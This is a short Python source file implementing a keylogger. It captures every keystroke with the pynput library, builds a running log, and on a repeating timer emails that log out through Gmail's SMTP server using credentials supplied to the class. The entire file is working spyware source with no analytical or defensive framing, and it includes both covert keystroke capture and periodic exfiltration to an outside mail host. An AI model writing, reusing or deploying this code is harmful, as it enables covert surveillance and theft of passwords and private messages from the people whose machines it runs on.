#! usr/bin/env/python


import pynput.keyboard
import threading
import smtplib

log = ''

class keylogger:

    def __init__(self,email, password, time):
        self.log = "Starting excecution"
        self.email = email
        self.password = password
        self.time = time

    def send_mail(self, email, password, log):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Crear una instancia del servidor smpt y el puerto en que corre
        server.starttls()  # inicia el servidor smtp
        server.login(self.email, self.password)  # inicia sesion en el servidor SMTP
        server.sendmail(self.email, self.email, self.log)  # 1from, 2to, 3content of the email
        server.quit()

    def append_log(self,string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError :
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = "\n\n"
        timer = threading.Timer(self.time, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

